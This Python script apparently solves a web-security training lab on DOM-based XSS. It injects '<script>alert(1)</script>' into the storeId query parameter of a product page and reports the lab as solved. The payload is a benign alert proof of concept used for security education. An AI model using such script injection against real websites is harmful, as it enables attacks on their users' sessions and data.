#####################################################################
#
# Lab: DOM XSS in document.write sink using source location.search 
#      inside a select element
#
# Hack Steps: 
#      1. Inject payload in the storeId query parameter
#      2. Observe that the alert function has been called
#
#####################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0aa400f7036227ff80b0ad08002d007d.web-security-academy.net"

def main():
    payload = "<script>alert(1)</script>"
    
    print("❯❯ Injecting payload in the storeId query parameter.. ", end="", flush=True)
    
    try:
        requests.get(f"{LAB_URL}/product?productId=1&storeId={payload}")

    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()